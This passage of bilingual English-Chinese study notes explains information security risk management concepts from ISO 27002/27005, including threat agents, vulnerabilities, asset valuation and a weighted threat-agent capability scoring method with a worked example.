network.</p><blockquote><p>即一个可以表现出威胁的实体。既可以是组织或网络的内部也可以是外部</p></blockquote><h4 id="0x02-threat"><a href="#0x02-threat" class="headerlink" title="0x02 threat"></a>0x02 threat</h4><p>A threat is a potential cause of an incident that may result in harm to a system or organisation (ISO 27002).</p><p>In other words, what can go wrong and how can it hurt the organisation?</p><p>This includes a number of categories, such as rootkits, backdoors, malware, natural disasters, etc.</p><blockquote><p>威胁就是可能对系统或组织造成损害 的事件的 潜在原因。</p><p>即什么会出错，它会怎么损害组织？</p><p>这包括大量分类，如rootkits，后门，恶意软件，自然灾害等</p></blockquote><h4 id="0x03-Vulnerability"><a href="#0x03-Vulnerability" class="headerlink" title="0x03 Vulnerability"></a>0x03 Vulnerability</h4><p>The threat will exploit a vulnerability:</p><p>A vulnerability is a weakness of an asset or a group of assets that can be exploited by one or more threats (ISO 27002). This may be in a procedure, hardware or software.</p><p>In other words, a vulnerability tells us why an asset is not protected from a threat.</p><blockquote><p>威胁会利用一个漏洞：</p><p>漏洞就是一项资产或一组资产的薄弱点，这个薄弱点可以被一个或多个威胁利用，可能存在于程序，硬件，软件中</p><p>漏洞告诉我们为什么资产没有免遭威胁</p></blockquote><h4 id="0x04-Risk"><a href="#0x04-Risk" class="headerlink" title="0x04 Risk"></a>0x04 Risk</h4><p>A risk is the potential that a given threat will exploit vulnerabilities of an asset or a group of assets and thereby cause harm to the organisation (ISO 27002).</p><p>We could also view this as the likelihood of a threat agent taking advantage of a vulnerability and the resultant impact to the organisation’s assets.</p><blockquote><p>风险是 一个给定的威胁 将会利用 一项资产或一组资产的漏洞 从而对组织造成损害的 可能性。</p><p>我们可以将这个视为 威胁代理利用漏洞的可能性，以及对于组织的资产产生的影响</p></blockquote><h4 id="0x05-Impact"><a href="#0x05-Impact" class="headerlink" title="0x05 Impact"></a>0x05 Impact</h4><p>The impact is the result of a risk materialising, caused by a threat, which affects assets (ISO 27005).</p><p>In other words, if the asset is exploited, what is the real cost to the organisation?</p><blockquote><p>影响就是 由威胁引起的风险 实现的结果，这会影响资产</p><p>即 如果资产被利用，组织的真正成本是多少？</p></blockquote><h4 id="0x06-Safeguard"><a href="#0x06-Safeguard" class="headerlink" title="0x06 Safeguard"></a>0x06 Safeguard</h4><p>Also known as risk treatment action, safeguards can be used to mitigate, transfer or remove the threat altogether.</p><blockquote><p>这也被称为风险处理措施，保障措施可以被用于缓解，转移或者完全消除威胁</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/security-management/f2.png"></p><blockquote><p>威胁代理产生威胁，威胁利用漏洞，漏洞导致风险，风险会损害资产以及产生影响，影响可以通过保障措施进行反制，保障措施会直接影响威胁代理</p></blockquote><h4 id="0x07-是否所有威胁都能利用漏洞？"><a href="#0x07-是否所有威胁都能利用漏洞？" class="headerlink" title="0x07 是否所有威胁都能利用漏洞？"></a>0x07 是否所有威胁都能利用漏洞？</h4><p>however, not all of them will be able to exploit vulnerabilities in all organisations. For example, there could be a new threat attacking a specific application configured in a certain way. However, if a company has the application configured differently, then the threat will not be able to exploit the vulnerability and pose a risk that causes the organisation to suffer exposure.</p><blockquote><p>并非所有威胁都可以利用所有组织的漏洞。</p><p>比如有一个新的威胁会攻击以某种方式配置的特定的应用程序，然而如果公司配置方式不同，那么该威胁就不能利用漏洞并构成导致组织遭受暴露的风险</p></blockquote><h4 id="0x08-example"><a href="#0x08-example" class="headerlink" title="0x08 example"></a>0x08 example</h4><p>威胁会告诉我们什么地方会出错，以及如何损害我们。本例的威胁是会下雨。</p><p>那么漏洞是什么？为什么我们的资产（新发型或是不防水的鞋）不能免遭这个威胁？可能因为我们忘记携带雨伞！</p><p>关键是组织需要采取行动去减轻 会因漏洞而造成的危害，本例是买个雨伞以及记得随身携带</p><p>那么风险是什么？即利用漏洞的威胁实现的可能性有多少？本例我们需要问自己一年中当前时间伦敦下雨的天数。比如现在是9月，那就是15天。这个可能性就是风险</p><p>即使无法阻止事件发生（如无法买伞或者忘记带），也可以提供响应措施</p><p>考虑潜在影响，如果影响较小而且不重要（比如只有一点点湿），那么接受该风险完全合适，也不需要进一步采取行动</p><p>但是如果影响较大，比如由于太湿导致我们在极其重要的工作面试中没有得到工作，那么采取措施去防止其发生就是非常重要的</p><h3 id="risk-management"><a href="#risk-management" class="headerlink" title="risk management"></a>risk management</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>Coordinated activities to direct and control an organisation with regard to cyber security risks(ISO27005).</p><p>Risk management ensures that security measures are:</p><ul><li>relevant</li><li>timely</li><li>responsive to threats</li><li>cost-effective.</li></ul><blockquote><p>在网络安全风险方面 指导和控制一个组织的 协调活动</p><p>确保安全措施是：</p><p>相关的，及时的，对威胁做出反应的，成本效益高的</p></blockquote><h4 id="风险管理生命周期"><a href="#风险管理生命周期" class="headerlink" title="风险管理生命周期"></a>风险管理生命周期</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/security-management/f3.png"></p><ol><li><p>首先需要识别组织可能面临什么风险</p></li><li><p>分析这些风险</p></li><li><p>基于这些分析，决定我们将如何处理这些风险</p></li><li><p>持续监测这些风险的变化情况，可能出现进一步的风险(further risks)</p></li></ol><h4 id="风险管理步骤-steps"><a href="#风险管理步骤-steps" class="headerlink" title="风险管理步骤 steps"></a>风险管理步骤 steps</h4><ol><li>asset identification 资产识别 - 分析组织的主要资产和它们对组织的价值，这对于理解和分析风险对组织的影响是至关重要的</li><li>threat assessment 威胁评估 - 分析哪些实体可能对组织构成威胁，以便更好地了解他们，并能够确定他们希望从组织中得到什么</li><li>vulnerability assessment 漏洞评估 - 对组织的系统、政策、程序和物理环境进行测试，以确定威胁可能利用的社会技术和物理漏洞</li><li>risk assessment 风险评估 - 综合前三个分析去分析组织面临的风险</li><li>risk treatment 风险处理 - 根据风险分析，考虑最佳行动方案（减少，转移，避免或者接受风险）来减轻风险</li><li>risk monitoring 风险监测 - 持续更新之前的分析过程，以确定资产，威胁，漏洞和由此产生的风险方面的变化，以确定风险处理是否需要改变</li></ol><h4 id="risk-analysis"><a href="#risk-analysis" class="headerlink" title="risk analysis"></a>risk analysis</h4><p>risk = threats * vulnerability * asset value</p><h4 id="residual-risk-剩余风险"><a href="#residual-risk-剩余风险" class="headerlink" title="residual risk 剩余风险"></a>residual risk 剩余风险</h4><p>处理了风险之后还剩下什么风险</p><p>residual risk = risk - countermeasures</p><h4 id="谁为风险负责"><a href="#谁为风险负责" class="headerlink" title="谁为风险负责"></a>谁为风险负责</h4><p>风险管理者的角色取决于</p><p>• Organisational Culture and operational sector.<br>• It also depends on what function is already there in the organisation</p><blockquote><ul><li>组织文化和业务部门</li><li>组织中已经存在的职能</li></ul></blockquote><h3 id="信息安全"><a href="#信息安全" class="headerlink" title="信息安全"></a>信息安全</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>The practice of preventing unauthorised access, use, disclosure, disruption, modification, inspection, recording or destruction of information.</p><blockquote><p>防止未经授权访问、使用、披露、破坏、修改、检查、记录或销毁信息的做法</p></blockquote><h4 id="信息的分类"><a href="#信息的分类" class="headerlink" title="信息的分类"></a>信息的分类</h4><p>信息作为资产，分为以下三类：</p><ol><li>pure information 纯信息 - social network dataset. 社交网络数据集，被用来了解用户之间的关系。</li><li>physical assets 实物资产 - mainframe. 硬件提供计算资源来存储和处理资产（纯信息）</li><li>software 软件 - Inventor Pro. 用来处理或管理信息。需要保证其完整性（没有后门）并且它可以对信息保密 confidential</li></ol><h4 id="信息安全的性质-CIA"><a href="#信息安全的性质-CIA" class="headerlink" title="信息安全的性质 CIA"></a>信息安全的性质 CIA</h4><ol><li>confidentiality - This entails restricting access to those who have a ‘need to know’. Letting those without the ‘need to know’ access information can result in embarrassment or, worse, financial penalties!</li><li>integrity - 信息只有在完整和准确的情况下才有用，并且始终如此。只有某些人应该有权更改，更新或删除信息</li><li>availability - 在需要时不可用的信息根本不是信息，而是不相关的数据</li></ol><p>其他性质：</p><ol><li>accountability - responsibility for actions on information (related to non-repudiation).</li><li>auditability - ability to review of actions, processes, policies and procedures.</li><li>reliability - when the system is down (e.g. due to an attack) how and how long does it take to bring it to normal operation.</li></ol><h4 id="安全策略和安全控制"><a href="#安全策略和安全控制" class="headerlink" title="安全策略和安全控制"></a>安全策略和安全控制</h4><h5 id="Security-policy"><a href="#Security-policy" class="headerlink" title="Security policy"></a>Security policy</h5><p>The top Information Security policy in an organisation needs to reflect the organisation’s view on Information Security (and the security properties they want), and must:</p><ul><li>provide Information Security direction for your organisation;</li><li>include Information Security objectives;</li><li>include information on how you will meet business, contractual, legal or regulatory requirements; and</li><li>contain a commitment to continually improve your Information Security Management.</li></ul><blockquote><p>组织的最高信息安全政策需要反映组织对信息安全的看法（以及他们想要的安全属性），必须：</p><ul><li>为组织提供信息安全方向</li><li>包含信息安全目标</li><li>包括你将如何满足业务，合同，法律或监管要求的信息</li><li>包含持续改进信息安全管理的承诺</li></ul></blockquote><h5 id="Security-control"><a href="#Security-control" class="headerlink" title="Security control"></a>Security control</h5><p>This is a way to operationalise security policies, and a way to treat risks in the risk management process, e.g. to reduce risks.</p><p>Controls may be technical, social (procedural), and/or physical. </p><blockquote><p>将安全政策操作化的一种方式，也是风险管理过程中处理风险的一种方式，如减少风险</p><p>控制可能是技术性的，社会性的（程序性的），物理性的</p></blockquote><h2 id="Threat-vulnerability-assessment"><a href="#Threat-vulnerability-assessment" class="headerlink" title="Threat, vulnerability assessment"></a>Threat, vulnerability assessment</h2><h3 id="asset-identification-and-valuation"><a href="#asset-identification-and-valuation" class="headerlink" title="asset identification and valuation"></a>asset identification and valuation</h3><h4 id="examples-of-assets"><a href="#examples-of-assets" class="headerlink" title="examples of assets"></a>examples of assets</h4><ul><li>systems (or networks of systems)</li><li>databases (or just information)</li><li>buildings (or other physical infrastructure)</li><li>intellectual property</li><li>business services</li><li>business processes (or workflows)</li><li>reputation</li></ul><h4 id="asset-valuation"><a href="#asset-valuation" class="headerlink" title="asset valuation"></a>asset valuation</h4><p>The value of an asset is prioritised by the contribution it makes to the business. This may include:</p><ul><li>how it contributes to security properties – e.g. CIA and other requirements (e.g. non-repudiation) </li><li>information classification policies (public vs highly sensitive information)</li><li>cost of compromise (replacement equipment)</li><li>interdependencies with other business systems/processes</li><li>personal injury or death.</li></ul><blockquote><p>资产价值取决于它对业务的贡献</p><ul><li>如何有助于安全属性</li><li>信息分类政策（公共信息与高度敏感信息）</li><li>妥协成本（更换设备）</li><li>与其他业务系统/流程的相互依赖性</li><li>人身伤害或死亡</li></ul></blockquote><p>The value of an asset is usually calculated by means of a <strong>business impact assessment</strong>. This predicts the consequences of disruption of a business function and process, and gathers information needed to develop recovery strategies. It considers both assets and employees that handle the asset.</p><blockquote><p>资产价值通常通过业务影响评估来计算。这可以预测业务功能和流程中断的后果，并收集制定恢复策略所需的信息。它考虑了资产和处理资产的员工。</p></blockquote><p>Impact can be divided into two categories:</p><ol><li>Direct value - The estimated cost or value of the asset’s loss or unavailability to the business. 资产损失或业务不可用的估计成本或价值</li><li>Indirect value - Would it impact (or damage) the business’ reputation if the asset was lost or (in the case of information) made public? Is it valuable to a competitor? Are there any other non-direct costs, e.g. fines?</li></ol><h4 id="asset-register-资产登记册"><a href="#asset-register-资产登记册" class="headerlink" title="asset register 资产登记册"></a>asset register 资产登记册</h4><p>A list of an organisation’s assets and their value (and impact of tamper), condition, location and who is responsible for them.</p><blockquote><p>组织资产及其价值（以及篡改的影响）、状况、位置和负责人的清单</p></blockquote><p>The asset register is normally created as a consultative project involving employees across the organisation, through workshops, questionnaires and/or interviews. It would include:</p><ul><li>hardware</li><li>information</li><li>people</li><li>processes</li><li>infrastructure</li></ul><blockquote><p>资产登记册通常是作为一个咨询项目而创建的，涉及整个组织的员工，通过研讨会、问卷调查和/或访谈</p><p>包括：硬件 信息 人们 流程 基础设施</p></blockquote><p>The asset register will value each asset and also assess the impact of <strong>tamper</strong>. Remember from above that value may lie in other areas such as reputation. Also, there may be linkages and dependencies between assets, e.g. information may be about people.</p><blockquote><p>资产登记册将评估每项资产并评估篡改的影响。请记住，价值可能存在于其他领域，例如声誉。此外，资产之间可能存在联系和依赖关系，例如信息可能与人有关</p></blockquote><h3 id="threat-assessment"><a href="#threat-assessment" class="headerlink" title="threat assessment"></a>threat assessment</h3><p>Threat assessment is the bedrock of a good risk assessment and allows you to explore who/what might harm or want to harm your organisation. It informs the risk analysis process to assess the likelihood of this danger materialising, leveraging open source intelligence and other sources of intelligence.</p><blockquote><p>威胁评估是良好风险评估的基石，可让您探索谁/什么可能伤害或想要伤害您的组织。它通知风险分析过程，以评估这种危险发生的可能性，利用开源情报和其他情报来源</p></blockquote><h4 id="definition"><a href="#definition" class="headerlink" title="definition"></a>definition</h4><p>Threat assessment identifies the threats to an organisation, and identifies the likely culprits of attacks.</p><blockquote><p>威胁评估确定对组织的威胁，并确定可能的攻击罪魁祸首</p></blockquote><p>提供量化、准确和可重复的结果可能很困难，信息安全中的威胁评估不是很成熟：它经常借鉴其他环境或领域（如国家安全）</p><h4 id="The-development-of-cyber-threat-assessment"><a href="#The-development-of-cyber-threat-assessment" class="headerlink" title="The development of cyber threat assessment"></a>The development of cyber threat assessment</h4><ol><li>Threat assessments were regularly carried out by nation states on other nation states. 民族国家经常对其他民族国家进行威胁评估</li><li>National threat analysis was done by experts, normally considered over lengthy periods involving a great deal of complexity. Threat analysts tended to specialise in specific parts of the threat spectrum, specific geographical regions, etc. 国家威胁分析是由专家完成的，通常要经过漫长的考虑，涉及大量的复杂性。威胁分析员往往专门研究威胁范围的特定部分、特定地理区域等</li><li>Later, businesses started to apply these same techniques for the marketplace, and cyber threat assessment for the Information Security industry also began to develop as a separate field. 后来，企业开始为市场应用这些相同的技术，信息安全行业的网络威胁评估也开始作为一个独立的领域发展</li></ol><h4 id="difference-between-state-threat-analysis-and-cyber-threat-assessment"><a href="#difference-between-state-threat-analysis-and-cyber-threat-assessment" class="headerlink" title="difference between state threat analysis and cyber threat assessment"></a>difference between state threat analysis and cyber threat assessment</h4><p>国家威胁分析 vs 网络威胁分析</p><p>State Threat Analysis</p><ul><li>state threat analysis normally has a long time period to make assessments 国家威胁分析通常需要很长时间来进行评估</li><li>state attacks normally involve a lengthy diplomacy phase coupled with a military build-up 国家袭击通常涉及漫长的外交阶段以及军事集结</li><li>terrorist attacks may not have a diplomacy phase but still need planning and deployment 恐怖袭击可能没有外交阶段，但仍需要规划和部署</li></ul><p>Cyber Threat Assessment</p><ul><li>cyber attacks have short timescales</li><li>there is a lower threshold to initiate an attack</li><li>no requirement to move physical resources</li><li>the attack can originate from any location</li><li>limited observable indicators</li><li>one attacker may have all they need.</li></ul><blockquote><p>网络攻击的时间范围很短<br>发起攻击的门槛较低<br>不需要移动物理资源<br>攻击可以从任何地方发起<br>可观察的指标有限<br>一个攻击者可能拥有他们所需要的一切</p></blockquote><p>Perhaps the other key difference is the <strong>difficulty of attribution</strong>, which is even higher than in national threat analysis (where it is already non-trivial in some cases). </p><blockquote><p>另一个关键区别是归因（我理解为想要找到原因的难度）的难度，这甚至高于国家威胁分析（在某些情况下这已经很重要了）</p><p>举例：</p><p>1998年2月，美国国防部的计算机系统受到攻击，这些袭击是广泛的、有协调的和有系统的。这发生在中东紧张局势加剧之际。是否是国家行为者，例如伊拉克或其盟友之一，负责？然而，原来是两个 16 岁的美国人，在以色列一名 18 岁的孩子的帮助下，使用家用电脑设备。这显示了网络威胁评估中归因的难度</p></blockquote><h4 id="threat-agent"><a href="#threat-agent" class="headerlink" title="threat agent"></a>threat agent</h4><p>They are of two main types: <strong>natural threats or accidents</strong> and <strong>malicious agents</strong>.</p><ol><li><p>Natural threats -  include the weather, which can for instance cause floods, potentially damaging IT infrastructure and/or making it unusable. Other natural threats include: earthquakes, fire, wind, lightning</p><p>These threat agents are relatively well-known because they affect multiple aspects of our lives and have been studied from long before IT even existed. In fact, insurance companies have insurance actuarial tables that can be very useful to understand the particular threats of this type which an organisation may face, depending on its geographical location.</p><blockquote><p>天气，例如，天气可能导致洪水，有可能破坏IT基础设施和/或使其无法使用。其他自然威胁包括地震，火灾，风，闪电</p><p>这些威胁因子相对来说是众所周知的，因为它们影响到我们生活的多个方面，而且从很早以前信息技术还没有出现的时候就已经开始研究。事实上，保险公司有保险精算表，对了解一个组织可能面临的这种类型的特殊威胁非常有用，这取决于其地理位置</p></blockquote></li><li><p>Accidental threats - where the threat agents are just people who do something wrong unintentionally, and where there is usually a lack of malicious intent.</p><p>Here, there is also insurance data that can be used to, for instance, predict physical accidents. However, there is much less data for electronic incidents (for example, do you know how many times a user has lost a pen drive in your organisation?). Accidents are affected over time by attitudes and training.</p><blockquote><p>意外威胁 - 威胁代理人只是无意中做错事的人，而且通常没有恶意</p><p>在这里，也有保险数据可以用来，比如，预测物理事故。然而，电子事故的数据要少得多（例如，你知道在你的组织中，有多少次用户丢失了一个笔式驱动器？） 事故会随着时间的推移受到态度和培训的影响</p></blockquote></li><li><p>Malicious agents -  are those who could <strong>intentionally</strong> pose a threat to an organisation. Such an agent may be an individual or group that can implement the threat.</p><blockquote><p>恶意代理 - 可能故意对一个组织构成威胁的人。这种代理人可能是能够实施威胁的个人或团体。</p></blockquote></li></ol><p>Characteristics of malicious threat agents:</p><ol><li>Motivation - Why are they doing this?</li><li>Capability - Can they do it and to what level? 能做到吗，达到什么水平</li><li>Catalyst - What set them off? 催化剂 是什么让他们开始行动</li><li>Inhibitors - What has/could put them off? 阻碍因素 什么已经/可能使他们放弃？</li><li>Amplifiers - What has/could push them on? 放大器 是什么已经/可能推动他们前进？</li></ol><p>Malicious threat agent groups: (只是一部分，不是全部)</p><ol><li><p>State-sponsored - These are threat agents sponsored by nation states or supra-national organisations. They are sometimes part of intelligence agencies or the military.</p><blockquote><p>国家资助 </p><p>由民族国家或超国家组织赞助的威胁代理。他们有时是情报机构或军队的一部分</p></blockquote></li><li><p>Terrorist - These are threat agents which have the intention of destabilising a nation or a society. They can be the most disruptive and do not care whether they are anonymous or not.</p><blockquote><p>意图破坏国家或社会稳定的威胁代理。他们可能是最具破坏性的，并且不在乎他们是否匿名</p></blockquote></li><li><p>Criminal - This refers to the usual person capable of breaking the law for their own purposes. They do not necessarily have extensive technical knowledge.</p><blockquote><p>能够为自己的目的触犯法律的普通人。他们不一定具有广泛的技术知识</p></blockquote></li><li><p>Hacker - As opposed to criminals, hackers <strong>do</strong> normally have extensive technical knowledge and their motives may not always be their own benefit.</p><blockquote><p>与犯罪分子不同，黑客通常拥有广泛的技术知识，他们的动机可能并不总是为了自己的利益</p></blockquote></li><li><p>Pressure group - These are those threat agents that pursue a particular agenda and would like to force the organisation to align with it.</p><blockquote><p>压力集团 - 这些是那些追求特定议程的威胁代理人，希望迫使组织与之保持一致</p></blockquote></li><li><p>Commercial group - These are those threat agents who are competitors in the same market sector as the target organisation.</p><blockquote><p>商业集团 </p><p>与目标组织处于同一市场领域的竞争对手</p></blockquote></li><li><p>Disaffected employee - An unhappy employee, or perhaps an ex-employee who was fired in what they perceived an unfair way and would like to take revenge.</p><blockquote><p>心怀不满的雇员</p><p>一个不开心的雇员，或者可能是一个被解雇的前雇员，他们认为这是一种不公平的方式，并希望进行报复</p></blockquote></li></ol><h4 id="From-threat-agent-to-threat"><a href="#From-threat-agent-to-threat" class="headerlink" title="From threat agent to threat"></a>From threat agent to threat</h4><p>威胁代理的特征起着作用并相互影响</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/security-management/f4.png"></p><p>但是，要对信息系统构成真正的威胁，威胁代理必须具备某种能力并能够获得物理或电子访问权限</p><h5 id="Catalysts"><a href="#Catalysts" class="headerlink" title="Catalysts"></a>Catalysts</h5><p>Catalysts are casual factors in a threat agent deciding whether to and when to carry out an attack. This may be the result of the following: 催化剂是威胁代理决定是否以及何时进行攻击的偶然因素。这可能是以下原因造成的</p><p><strong>Events:</strong> such as a publicity event for an organisation with which the threat agent has a dispute or a dislike, the start of an armed conflict between the threat agent’s country, or one for which they have sympathy, and an opponent. 如与威胁者有争议或不喜欢的组织的宣传活动，威胁者的国家或他们同情的国家与对手之间的武装冲突开始。</p><p><strong>Personal circumstances:</strong> such as changes in location, social grouping, or employment status. 个人情况：地点、社会团体或就业状况的变化</p><p><strong>Commercial gain:</strong> such as the commercial imperative to gain advantage against a competitor. 商业利益：如对竞争者取得优势的商业需要</p><p><strong>Technology changes:</strong> such as new technology that makes what was previously not achievable a possibility. 技术变化：新技术使以前无法实现的事情成为可能</p><h5 id="Capability"><a href="#Capability" class="headerlink" title="Capability"></a>Capability</h5><p>For a malicious threat agent to be effective, they need to have the actual capability to conduct and, if necessary, to sustain an attack. This includes having: 为了使恶意威胁代理有效，他们需要有实际能力进行攻击，并在必要时维持攻击。这包括拥有</p><ul><li>adequate resources (including equipment and facilities, personnel, time and funding)</li><li>tools (including technology and software)</li><li>knowledge (including education and training, books and manuals, and methods and knowhow).</li></ul><blockquote><ul><li>充分的资源（包括设备和设施、人员、时间和资金）</li><li>工具（包括技术和软件）</li><li>知识（包括教育和培训、书籍和手册，以及方法和诀窍）</li></ul></blockquote><h5 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h5><p>Regarding motivation, this is even more subjective than the other characteristics, and the list of motivational factors is potentially huge. ﻿These factors depend on the grouping or combination of groupings from which the threat agent originates, and these factors may act together to influence the threat agent (that is, it may be a combination of motivational factors). Possible factors may include (but are not limited to): 关于动机，这甚至比其他特征更加主观，而动机因素的清单可能是巨大的。 ﻿这些因素取决于威胁源的分组或分组组合，这些因素可能共同作用于威胁源（即可能是动机因素的组合）。可能的因素可能包括（但不限于）</p><ul><li>politics</li><li>crime</li><li>religion/belief</li><li>terror</li><li>competitive advantage</li><li>personal gain (including revenge, profit, knowledge, power or curiosity).</li></ul><blockquote><ul><li>政治</li><li>犯罪</li><li>宗教/信仰</li><li>恐怖活动</li><li>竞争优势</li><li>个人利益（包括报复、利润、知识、权力或好奇心）</li></ul></blockquote><h5 id="Inhibitors"><a href="#Inhibitors" class="headerlink" title="Inhibitors"></a>Inhibitors</h5><p>A range of influences and factors may inhibit a malicious threat agent from carrying out a successful attack. 一系列影响和因素可能会阻止恶意威胁代理执行成功的攻击</p><p>An inhibitor may work in a number of ways. First, it may reduce the inclination of a threat agent to initiate an attack. Second, it may prevent a threat agent from initiating or carrying out a successful attack. Third, it may minimise the impact a successful attack will have. The following is a non-exclusive list of examples:</p><blockquote><p>阻碍因素可能以多种方式发挥作用。首先，它可以减少威胁者发起攻击的倾向。第二，它可能阻止威胁者发起或实施成功的攻击。第三，它可以最大限度地减少成功的攻击所带来的影响。以下是一个非排他性的例子清单</p></blockquote><p><strong>Fear:</strong> the fear of being captured (or identified) as a result of conducting an attack may make the threat ﻿agent decide not to carry out the attack.</p><p><strong>Technical difficulty:</strong> if the level of technical difficulty that the threat agent encounters or expects to conduct an attack is sufficiently high, the threat agent may decide it is not worth the investment of effort required to attempt or continue the attack.</p><p><strong>Sensitivity to peer/public perceptions:</strong> if the threat agent perceives that their peers or the public will hold them in contempt for attempting the attack; for example, if the target was a hospital or a charity.</p><p>Cost of participation: if the cost, whether monetary or time or other, is too high to launch an attack, this may also act as a deterrent.</p><blockquote><p>恐惧：害怕因进行攻击而被抓获（或被识别），可能使威胁者决定不进行攻击。</p><p>技术难度：如果威胁者在进行攻击时遇到或预期的技术难度足够高，威胁者可能会决定不值得投入所需的精力来尝试或继续攻击。</p><p>对同行/公众看法的敏感性：如果威胁者认为他们的同行或公众会因为尝试攻击而对他们产生蔑视；例如，如果目标是医院或慈善机构。</p><p>参与成本：如果发动攻击的成本，无论是金钱、时间还是其他方面，都太高，这也可能成为一种威慑。</p></blockquote><h5 id="Amplifiers"><a href="#Amplifiers" class="headerlink" title="Amplifiers"></a>Amplifiers</h5><p>Amplifiers are influences that increase the possibility of an attack occurring or being successful. Amplifiers are varied and dependent on the threat agent but include factors such as the following:</p><blockquote><p>放大器是增加攻击发生或成功的可能性的影响因素。放大器是多种多样的，取决于威胁代理，但包括以下因素</p></blockquote><p><strong>Fame and/or peer pressure:</strong> there is the desire of the threat agent to be well regarded by their peers or to become famous. Their desire is to gain the recognition and respect of peers and/or notoriety through the demonstration of skills, and this will strengthen their resolve to carry out the attack.</p><p><strong>Access to information:</strong> the ability to gain access to the information that the agent needs to mount an attack. This includes both information about the target as well as information about techniques and ways to carry out attacks.</p><p><strong>De-skilling:</strong> where there are available scripts or exploits already made that can be used by potential threat agents. These include freely available ones or paid-for ones if the threat agent has sufficient financial resources.</p><p><strong>Poor target security:</strong> if a threat agent knows that the target organisation is not very security-minded they could consider it as an easy target.</p><blockquote><p>名声和/或同龄人的压力：威胁者有希望得到同龄人的好评或成名。他们的愿望是通过展示技能获得同行的认可和尊重和/或声名鹊起，这将加强他们实施攻击的决心。</p><p>获取信息：获得代理人发动攻击所需信息的能力。这既包括关于目标的信息，也包括关于实施攻击的技术和方法的信息。</p><p>解除技能：有可用的脚本或已经制成的漏洞，可供潜在的威胁代理人使用。这包括免费提供的脚本或付费的脚本，如果威胁者有足够的财政资源。</p><p>目标安全性差：如果威胁代理人知道目标组织没有很好的安全意识，他们可能会认为它是一个容易的目标。</p></blockquote><h4 id="Threat-assessment-methodology"><a href="#Threat-assessment-methodology" class="headerlink" title="Threat assessment methodology"></a>Threat assessment methodology</h4><p>The goals are:</p><ul><li>understanding how threat informs the risk assessment process (enabling priority areas to be identified)</li><li>providing an audit trail for due diligence/care</li><li>provoking reflection about the inputs to the risk assessment.</li></ul><blockquote><p>了解威胁是如何影响风险评估过程的（使优先领域得以确定）<br>为尽职调查/照顾提供审计线索<br>引发对风险评估投入的思考</p></blockquote><p>a starting point for thinking about threat agents is the relationship between the threat and the target:</p><ul><li>states should consider attacks from other states</li><li>companies should consider attacks from other companies</li><li>personal motivation should also be investigated</li></ul><blockquote><p>思考威胁因素的出发点是威胁与目标之间的关系。</p><p>国家应考虑来自其他国家的攻击<br>公司应考虑来自其他公司的攻击<br>个人动机也应被调查</p></blockquote><p>The threat agent is scored according to five criteria:</p><table><thead><tr><th></th><th>Score</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Factor</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td></tr><tr><td>Group size (Q)</td><td>1-25</td><td>26-50</td><td>51-100</td><td>101-200</td><td>201-300</td><td>&gt;300</td></tr><tr><td>History of relevant activity (H)</td><td>None</td><td>Intermittent</td><td>Occasional</td><td>Occasional</td><td>Regular</td><td>Regular and widespread</td></tr><tr><td>Technical expertise (T)</td><td>None</td><td>Very limited</td><td>Limited</td><td>Limited</td><td>Adequate</td><td>High Level</td></tr><tr><td>Prowess within community (Pr)</td><td>Not part of a group</td><td>Peripheral interest</td><td>Interest within group</td><td>Significant within group</td><td>Important within group</td><td>Very important within group</td></tr><tr><td>Reason for target selection (U)</td><td>Curiosity</td><td>Rebellion</td><td>Criminal Gain</td><td>Criminal Gain</td><td>Belief</td><td>Revenge, religion, racism, nationalism</td></tr></tbody></table><p><strong>TC = (Q x 4) + (T x 3) + (H x 7) + (U x 6) + Pr</strong></p><h5 id="example"><a href="#example" class="headerlink" title="example"></a>example</h5><p>想象一下，我们正在为航空航天业工作，思考一个虚构的黑客（或 “黑客活动 “团体）</p><p>下面是我们掌握的关于这个团体的情报。<br>他们有200多次DOS攻击的历史，以及30次成功的入侵，他们能够提取和发布敏感信息。他们作为网上反战运动的一部分，已经成功地攻击了一些军事、政府和私人承包商的网络和系统。</p><p>该小组在论坛上开会，大约有60名参与者。他们是一个更广泛的基于意识形态的国际努力中的核心群体，在其中，他们的探索被视为英雄。</p><table><thead><tr><th align="left">Factors</th><th align="left">Hacker group</th><th align="left">Value</th></tr></thead><tbody><tr><td align="left">Size of group (Q)</td><td align="left">Over 60 in forums</td><td align="left">3</td></tr><tr><td align="left">Technical expertise (T)</td><td align="left">Widespread reporting of their attacks on a number of military systems</td><td align="left">6</td></tr><tr><td align="left">History of activity (H)</td><td align="left">History of attacking defence and related areas</td><td align="left">6</td></tr><tr><td align="left">Prowess within community (Pr)</td><td align="left">They are the core group within a wider international ideology-based effort</td><td align="left">6</td></tr><tr><td align="left">Reason for target selection (U)</td><td align="left">Exert pressure due to ideology</td><td align="left">5</td></tr></tbody></table><p>TC = (3×4) + (6×3) + (6×7) + (5×6) + 6 = 108/126 = 85.7 per cent</p><p>这是一个定性的方法–我们可以认为这个威胁代理是非常有能力的，（如果是10-30%的数字，显然可能不是非常有能力）</p><p>如果你算的数略高或略低（70%/90%），问题不大，都是同等重要的威胁</p><h5 id="The-overall-methodology"><a href="#The-overall-methodology" class="headerlink" title="The overall methodology"></a>The overall methodology</h5><p>The possibility to <strong>rate</strong> or <strong>rank</strong> the threat agents based on the five criteria is useful to:</p><p>gain insight into the areas of greatest concern (consider what your thresholds for taking action are)<br>determine where effort and resources should be applied.</p><blockquote><p>深入了解最受关注的领域（考虑你采取行动的门槛是什么）</p><p>确定应该在哪些方面投入精力和资源。</p></blockquote><h3 id="vulnerability-assessment"><a href="#vulnerability-assessment" class="headerlink" title="vulnerability assessment"></a>vulnerability assessment</h3><p>Vulnerabilities are those things that can be exploited in order to breach security properties</p><blockquote><p>漏洞是那些可以被利用以破坏安全属性的东西</p></blockquote><p>Vulnerabilities may be in: </p><ul><li> Technology </li><li>Processes </li><li>People</li></ul><p>Vulnerabilities listed in various places </p><ul><li>NIST National Vulnerability Database (<a href="https://nvd.nist.gov/">https://nvd.nist.gov/</a>) </li><li>Open Source Vulnerability Database </li><li>US-CERT Vulnerability database </li><li>UK-CERT / NCSC CiSP (<a 